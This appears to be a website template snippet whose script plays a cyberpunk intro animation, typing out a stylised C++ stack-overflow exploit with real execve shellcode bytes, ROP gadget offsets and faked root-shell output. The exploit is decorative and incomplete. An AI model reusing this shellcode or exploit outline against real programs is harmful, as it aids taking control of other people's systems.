<!-- 開場動畫：ret2shellcode exploit「編譯 → 執行 → ACCESS GRANTED」終端機演出。
     每 session 只播一次；點擊或按任意鍵可跳過。內嵌同步執行以避免內容先閃現；
     樣式見 cyberpunk.css 的 #boot-intro。 -->
<script>
(function () {
  'use strict';
  var KEY = 'ep_boot_seen';
  try { if (sessionStorage.getItem(KEY)) return; } catch (e) {}

  var TYPE_MS = 22, CODE_MS = 42, OUT_MS = 100, GRANT_HOLD = 650;
  // t:'type' 逐字打字(指令)；'code' 程式碼浮現(自動語法上色)；
  // 'out' 執行輸出；'grant' 最終 ACCESS GRANTED
  var steps = [
    { t: 'type', x: '$ cat ret2sc.cpp', c: 'cmd' },
    { t: 'code', x: '// ================================================================' },
    { t: 'code', x: '//  ret2sc.cpp :: NX/ASLR bypass -> mprotect ROP -> shellcode' },
    { t: 'code', x: '//  target: ./vuln   stack bof, 264B buf, PIE + NX, partial RELRO' },
    { t: 'code', x: '#include <cstdio>' },
    { t: 'code', x: '#include <cstring>' },
    { t: 'code', x: '#include <cstdint>' },
    { t: 'code', x: '#include <unistd.h>' },
    { t: 'code', x: '#include <sys/mman.h>' },
    { t: 'code', x: '#include <sys/wait.h>' },
    { t: 'code', x: '' },
    { t: 'code', x: '#define BUF       264' },
    { t: 'code', x: '#define POP_RDI   0x0000000000023b6a   // pop rdi ; ret' },
    { t: 'code', x: '#define POP_RSI   0x000000000002601f   // pop rsi ; pop r15 ; ret' },
    { t: 'code', x: '#define POP_RDX   0x0000000000001b96   // pop rdx ; ret' },
    { t: 'code', x: '#define MPROTECT  0x00000000000e5250   // libc mprotect offset' },
    { t: 'code', x: '#define PAGE(x)   ((x) & ~0xfffUL)' },
    { t: 'code', x: '' },
    { t: 'code', x: '// execve("/bin/sh", 0, 0)  --  27 bytes, null-free' },
    { t: 'code', x: 'static const uint8_t shellcode[] = {' },
    { t: 'code', x: '  0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,' },
    { t: 'code', x: '  0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05' },
    { t: 'code', x: '};' },
    { t: 'code', x: '' },
    { t: 'code', x: 'static uint64_t leak_libc(int fd);            // stage-1: puts@GOT leak' },
    { t: 'code', x: 'static void     build_chain(uint8_t *p, uint64_t base, uint64_t sc);' },
    { t: 'code', x: '' },
    { t: 'code', x: 'int main(int argc, char **argv) {' },
    { t: 'code', x: '    int fd[2]; pipe(fd);' },
    { t: 'code', x: '    uint64_t libc = leak_libc(fd[0]);          // defeat ASLR' },
    { t: 'code', x: '    uint64_t base = libc - 0x0000000000084420;  // puts -> libc base' },
    { t: 'code', x: '    uint64_t sc_page = PAGE(base + 0x1ec000);' },
    { t: 'code', x: '    fprintf(stderr, "[*] libc base = %#018lx\\n", base);' },
    { t: 'code', x: '' },
    { t: 'code', x: '    uint8_t payload[BUF + 0x200];' },
    { t: 'code', x: '    memset(payload, 0x41, BUF);                 // stack padding' },
    { t: 'code', x: '    *(uint64_t *)(payload + BUF) = 0xdeadbeefcafebabe;  // saved rbp' },
    { t: 'code', x: '    uint8_t *rop = payload + BUF + 8;' },
    { t: 'code', x: '    build_chain(rop, base, sc_page);            // mprotect(pg,0x1000,7)' },
    { t: 'code', x: '    memcpy(rop + 0x60, shellcode, sizeof shellcode);   // ret2sc pad' },
    { t: 'code', x: '' },
    { t: 'code', x: '    if (fork() == 0) { dup2(fd[0], 0); execl("./vuln", "vuln", 0); }' },
    { t: 'code', x: '    write(fd[1], payload, sizeof payload);      // smash the stack' },
    { t: 'code', x: '    return wait(0);' },
    { t: 'code', x: '}' },
    { t: 'type', x: '$ g++ -zexecstack -no-pie -w ret2sc.cpp -o pwn', c: 'cmd' },
    { t: 'type', x: '$ ./pwn', c: 'cmd' },
    { t: 'out',  x: '<span class="ok">[*]</span> stage-1: leaking puts@GOT ....... 0x7f3c1a04e2a0' },
    { t: 'out',  x: '<span class="ok">[*]</span> libc base   = 0x00007f3c19fca000  (glibc 2.39)' },
    { t: 'out',  x: '<span class="ok">[*]</span> stage-2: mprotect(0x55e3a1b000, 0x1000, RWX)' },
    { t: 'out',  x: '<span class="ok">[*]</span> pivot &rarr; shellcode   execve("/bin/sh")' },
    { t: 'type', x: '# id', c: 'cmd' },
    { t: 'out',  x: 'uid=0(<span class="ok">root</span>) gid=0(<span class="ok">root</span>) groups=0(<span class="ok">root</span>)' },
    { t: 'grant', x: '&gt; ACCESS GRANTED' }
  ];

  var ov, log, timers = [], done = false;
  function T(fn, ms) { var id = setTimeout(fn, ms); timers.push(id); return id; }
  function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
  function bottom() { if (log) log.scrollTop = log.scrollHeight; }

  // 極簡 C/C++ 語法高亮：關鍵字 / 前置處理 / 註解 / 字串 / 數字
  var KW = /^(auto|bool|char|const|double|extern|float|for|if|else|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|union|unsigned|void|volatile|while|uint8_t|uint16_t|uint32_t|uint64_t|int8_t|int16_t|int32_t|int64_t|size_t|ssize_t)$/;
  function hl(src) {
    if (!src) return '';
    var out = '', i = 0, n = src.length;
    while (i < n) {
      var rest = src.slice(i), ch = src[i];
      if (ch === '#' && /^\s*$/.test(src.slice(0, i))) {
        var pm = rest.match(/^#\s*[A-Za-z_]+/);
        if (pm) { out += '<span class="pp">' + esc(pm[0]) + '</span>'; i += pm[0].length; continue; }
      }
      if (ch === '/' && src[i + 1] === '/') { out += '<span class="cm">' + esc(rest) + '</span>'; break; }
      if (ch === '"') {
        var sm = rest.match(/^"(\\.|[^"\\])*"/);
        var lit = sm ? sm[0] : rest;
        out += '<span class="st">' + esc(lit) + '</span>'; i += lit.length; continue;
      }
      if (/[0-9]/.test(ch) && !/\w/.test(src[i - 1] || '')) {
        var num = rest.match(/^(0[xX][0-9a-fA-F]+|[0-9]+)[uUlL]*/);
        if (num) { out += '<span class="num">' + num[0] + '</span>'; i += num[0].length; continue; }
      }
      if (/[A-Za-z_]/.test(ch)) {
        var id = rest.match(/^[A-Za-z_]\w*/)[0];
        out += KW.test(id) ? '<span class="kw">' + id + '</span>' : esc(id);
        i += id.length; continue;
      }
      out += esc(ch); i++;
    }
    return out;
  }

  function finish() {
    if (done) return; done = true;
    timers.forEach(clearTimeout);
    try { sessionStorage.setItem(KEY, '1'); } catch (e) {}
    document.removeEventListener('keydown', finish);
    if (!ov) return;
    ov.classList.add('boot-done');
    setTimeout(function () { if (ov && ov.parentNode) ov.parentNode.removeChild(ov); }, 420);
  }

  function run() {
    ov = document.createElement('div');
    ov.id = 'boot-intro';
    ov.innerHTML = '<div class="boot-inner"><div id="boot-log"></div>' +
                   '<div class="boot-skip">[ 點擊或按任意鍵跳過 ]</div></div>';
    document.body.appendChild(ov);
    ov.addEventListener('click', finish);
    document.addEventListener('keydown', finish);
    log = ov.querySelector('#boot-log');

    var idx = 0;
    function next() {
      if (done || idx >= steps.length) return;
      var s = steps[idx++];
      if (s.t === 'type')  return typeLine(s.x, s.c || 'cmd', next);
      if (s.t === 'grant') return grant(s.x);
      if (s.t === 'code')  return printLine(hl(s.x), 'code', CODE_MS, next);
      printLine(s.x, 'out', OUT_MS, next);      // t === 'out'
    }
    function printLine(html, cls, delay, cb) {
      var d = document.createElement('div');
      d.className = 'boot-line ' + cls;
      d.innerHTML = html || '&nbsp;';           // 空行仍占一行高度
      log.appendChild(d); bottom();
      T(cb, delay);
    }
    function typeLine(text, cls, cb) {
      var d = document.createElement('div');
      d.className = 'boot-line ' + (cls || '');
      log.appendChild(d);
      var i = 0;
      (function tick() {
        if (done) return;
        d.innerHTML = esc(text.slice(0, i)) + '<span class="cur"></span>';
        bottom();
        if (i < text.length) { i++; T(tick, TYPE_MS); }
        else { d.innerHTML = esc(text); T(cb, 200); }
      })();
    }
    function grant(html) {
      var d = document.createElement('div');
      d.className = 'boot-line';
      d.innerHTML = '<span class="granted">' + html + '</span>';
      log.appendChild(d); bottom();
      ov.classList.add('boot-flash');
      T(finish, GRANT_HOLD);
    }
    T(next, 250);
  }

  if (document.body) run();
  else document.addEventListener('DOMContentLoaded', run);
})();
</script>

<!-- 全螢幕動態背景：Lightfall（移植自 React Bits，改用原生 JS + OGL）。
     取代舊的 Vanta.NET。若要還原，把此區塊換回 Vanta 並移除下方兩支 script。 -->
<style>
  #lightfall-bg {
    position: fixed;
    z-index: -1;
    top: 0;
    left: 0;
    width: 100%;          /* 用 100% 而非 100vw，避免含捲軸寬度造成水平溢出 */
    height: 100%;
    pointer-events: none; /* 避免特效擋住網頁點擊 */
    opacity: 0.4;         /* 降低不透明度，維持內容可讀性 */
  }
</style>
<script src="{{ "/js/lightfall-bg.js" | relURL }}"></script>
